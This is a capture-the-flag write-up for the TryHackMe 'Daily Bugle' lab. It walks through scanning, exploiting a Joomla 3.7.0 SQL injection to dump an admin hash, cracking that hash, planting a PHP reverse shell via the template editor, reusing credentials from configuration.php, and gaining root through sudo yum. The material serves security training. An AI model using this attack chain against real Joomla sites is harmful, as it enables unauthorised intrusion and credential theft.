---
title : Daily Bugle - Writeup
---

_**Jan 04, 2021**_

[Daily Bugle](https://tryhackme.com/room/dailybugle) Writeup


## Recon :

```sh
bvr0n@kali:~/CTF/THM/DailyBugle$ nmap -sC -sV 10.10.177.60
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
```

Looks like we have a website running on port `80`, Let's enumerate it. Meanwhile let's run `Gobuster` to see if there something intresting :
                                                                                                                                                                     
```sh
bvr0n@kali:~/joomscan$ gobuster dir -u http://10.10.177.60/ -w ~/Documents/Dirbuster/wordlist.txt                                                                    

/administrator (Status: 301)
/bin (Status: 301)
/cache (Status: 301)
/cgi-bin/ (Status: 403)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/index.php (Status: 200)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/robots.txt (Status: 200)
```

so `/administrator` caught our eyes, so after checking that login page, it looks like it's running `Joomla`, Let's try to figure out which version of `Joola`.

i used `joomscan`, You can find it [Here](https://github.com/OWASP/joomscan).

```sh
bvr0n@kali:~/joomscan$ perl joomscan.pl -u http://10.10.177.60/

    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.177.60/ ...

[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
```
So from the scan, it seems like it's running the 3.7.0 version, let's look if this one have a know vulnerability :

```sh
bvr0n@kali:~$ searchsploit joomla 3.7.0
-------------------------------------------------------------------------------------------------------------- ------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                    |  php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                 |  php/webapps/43488.txt
-------------------------------------------------------------------------------------------------------------- ------------------------
```
I kept looking in the internet about that version, and i stumbled across this script abusing ths SQLI in this version. [Script](https://github.com/XiphosResearch/exploits/tree/master/Joomblah) :

```sh
bvr0n@kali:~/CTF/THM/DailyBugle$ python joomblah.py http://10.10.177.60
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/****************.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

As we noticed this gave us `jonah's` hash, Let's decrypt it using `John The Ripper`.

```sh
bvr0n@kali:~/CTF/THM/DailyBugle$ sudo john jonah_hash --wordlist=/home/bvr0n/Documents/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
************     (?)
1g 0:00:16:32 DONE (2020-11-22 13:36) 0.001007g/s 47.20p/s 47.20c/s 47.20C/s spiderman123..skater101
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Let's login to the Administrator panel using this password. After a success login we can upload a .php reverse shell inside like this : 
```
System > Global configuration > media
```
and upload a reverse shell here :

```
Extension > templates > Templates > Protostar > index.php
```

Set up a listner first before executing the script.

## Privilege Escalation :

We can see that inside `/var/www/html` a file named `configuration.php`, this file is used to configure Joomla & may contain some passwords.

```sh
bash-4.2$ cd /var/www/html
bash-4.2$ ls
LICENSE.txt    bin    components         images     language   media    robots.txt  web.config.txt
README.txt     cache  configuration.php  includes   layouts    modules  templates
administrator  cli    htaccess.txt       index.php  libraries  plugins  tmp
```

So read the file and grabe the password, this password also works on SSH, let's `ssh` as `jjameson`.

Now that we’re logged in as `jjameson`, the first thing we’re going to try is the `sudo -l` command to get us a list of commands we’re allowed to run as sudo:

```sh
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Looks like we can use sudo to run `Yum`, This is where [GTFOBins](https://gtfobins.github.io/gtfobins/yum/) comes in place :

Let’s copy that code into `jjameson’s`, And we are `root` now:

```sh
sh-4.2# id && hostname
uid=0(root) gid=0(root) groups=0(root)
dailybugle
```

I hope you enjoyed my writeup.
